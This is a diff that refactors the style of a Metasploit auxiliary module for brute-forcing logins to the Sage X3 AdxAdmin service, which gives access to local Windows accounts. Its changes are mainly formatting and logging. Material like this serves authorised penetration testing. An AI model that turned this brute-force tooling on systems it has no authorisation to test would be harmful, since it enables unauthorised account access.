@@ -1,5 +1,11 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
 require 'metasploit/framework/login_scanner/x3'
 require 'metasploit/framework/credential_collection'
+
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Scanner
@@ -11,18 +17,18 @@ class MetasploitModule < Msf::Auxiliary
     super(
       'Name' => 'Sage X3 AdxAdmin Login Scanner',
       'Description' => %q{
-      This module allows an attacker to perform a password guessing attack against
-      the Sage X3 AdxAdmin service which in turn can be used to authenticate against
-      as a local windows account.
+        This module allows an attacker to perform a password guessing attack against
+        the Sage X3 AdxAdmin service, which in turn can be used to authenticate to
+        a local Windows account.
 
-      This module implements the X3Crypt function to 'encrypt' any passwords to
-      be used during the authentication process, provided a plaintext password.
+        This module implements the X3Crypt function to 'encrypt' any passwords to
+        be used during the authentication process, given a plaintext password.
       },
       'Author' => ['Jonathan Peterson <deadjakk[at]shell.rip>'], # @deadjakk
       'License' => MSF_LICENSE,
       'References' =>
         [
-          [ 'URL', 'https://www.rapid7.com/blog/post/2021/07/07/cve-2020-7387-7390-multiple-sage-x3-vulnerabilities/'],
+          ['URL', 'https://www.rapid7.com/blog/post/2021/07/07/cve-2020-7387-7390-multiple-sage-x3-vulnerabilities/']
         ]
       )
 
@@ -34,12 +40,7 @@ class MetasploitModule < Msf::Auxiliary
       ]
     )
 
-    deregister_options('PASSWORD_SPRAY')
-    deregister_options('BLANK_PASSWORDS')
-  end
-
-  def target
-    "#{rhost}:#{rport}"
+    deregister_options('PASSWORD_SPRAY', 'BLANK_PASSWORDS')
   end
 
   def run_host(ip)
@@ -73,24 +74,22 @@ class MetasploitModule < Msf::Auxiliary
         module_fullname: fullname,
         workspace_id: myworkspace_id
       )
+
       case result.status
       when Metasploit::Model::Login::Status::SUCCESSFUL
-        print_brute level: :good, ip: ip, msg: "Success: '#{result.credential}'"
+        print_brute(level: :good, ip: ip, msg: "Success: '#{result.credential}'")
         credential_core = create_credential(credential_data)
         credential_data[:core] = credential_core
         create_credential_login(credential_data)
         next
       when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
-        if datastore['VERBOSE']
-          print_brute level: :verror, ip: ip, msg: "Could not connect: #{result.proof}"
-        end
+        vprint_brute(level: :verror, ip: ip, msg: "Could not connect: #{result.proof}")
       when Metasploit::Model::Login::Status::INCORRECT
-        if datastore['VERBOSE']
-          print_brute level: :verror, ip: ip, msg: "Failed: '#{result.credential}'"
-        end
+        vprint_brute(level: :verror, ip: ip, msg: "Failed: '#{result.credential}'")
       end
 
       invalidate_login(credential_data)
     end
   end
+
 end
